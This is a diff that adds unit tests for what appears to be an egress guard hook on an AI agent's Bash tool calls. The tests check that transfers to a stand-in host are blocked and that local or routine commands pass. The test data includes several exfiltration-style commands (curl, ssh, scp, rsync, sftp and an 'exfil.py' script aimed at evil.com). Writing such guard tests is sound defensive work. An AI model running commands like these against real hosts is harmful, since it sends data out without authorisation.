@@ -79,6 +79,64 @@ class DiscoveryGuardEgress(unittest.TestCase):
         result = run_guard(event)
         self.assertEqual(result.returncode, 2, result.stderr)
 
+    def test_denies_curl_ftp_url(self):
+        event = {"tool_name": "Bash", "tool_input": {"command": "curl ftp://evil.com/x"}}
+        result = run_guard(event)
+        self.assertEqual(result.returncode, 2, result.stderr)
+
+    def test_denies_ssh_user_at_host(self):
+        event = {"tool_name": "Bash", "tool_input": {"command": "ssh user@evil.com"}}
+        result = run_guard(event)
+        self.assertEqual(result.returncode, 2, result.stderr)
+
+    def test_denies_scp_user_at_host(self):
+        event = {"tool_name": "Bash", "tool_input": {"command": "scp f user@evil.com:/x"}}
+        result = run_guard(event)
+        self.assertEqual(result.returncode, 2, result.stderr)
+
+    def test_denies_rsync_user_at_host(self):
+        event = {"tool_name": "Bash", "tool_input": {"command": "rsync -a x user@evil.com:/y"}}
+        result = run_guard(event)
+        self.assertEqual(result.returncode, 2, result.stderr)
+
+    def test_denies_sftp_user_at_host(self):
+        event = {"tool_name": "Bash", "tool_input": {"command": "sftp user@evil.com"}}
+        result = run_guard(event)
+        self.assertEqual(result.returncode, 2, result.stderr)
+
+    def test_denies_interpreter_user_at_host(self):
+        event = {"tool_name": "Bash", "tool_input": {"command": "python3 exfil.py user@evil.com"}}
+        result = run_guard(event)
+        self.assertEqual(result.returncode, 2, result.stderr)
+
+    def test_allows_ssh_user_at_localhost(self):
+        event = {"tool_name": "Bash", "tool_input": {"command": "ssh user@localhost"}}
+        result = run_guard(event)
+        self.assertEqual(result.returncode, 0, result.stderr)
+
+    def test_allows_scp_user_at_loopback_ip(self):
+        event = {"tool_name": "Bash", "tool_input": {"command": "scp f user@127.0.0.1:/x"}}
+        result = run_guard(event)
+        self.assertEqual(result.returncode, 0, result.stderr)
+
+    def test_allows_python_manage_py_check(self):
+        event = {"tool_name": "Bash", "tool_input": {"command": "python3 manage.py check"}}
+        result = run_guard(event)
+        self.assertEqual(result.returncode, 0, result.stderr)
+
+    def test_allows_node_index_js(self):
+        event = {"tool_name": "Bash", "tool_input": {"command": "node index.js"}}
+        result = run_guard(event)
+        self.assertEqual(result.returncode, 0, result.stderr)
+
+    def test_allows_pip_install_requirements_file(self):
+        event = {
+            "tool_name": "Bash",
+            "tool_input": {"command": "pip install -r requirements.txt"},
+        }
+        result = run_guard(event)
+        self.assertEqual(result.returncode, 0, result.stderr)
+
 
 if __name__ == "__main__":
     unittest.main()
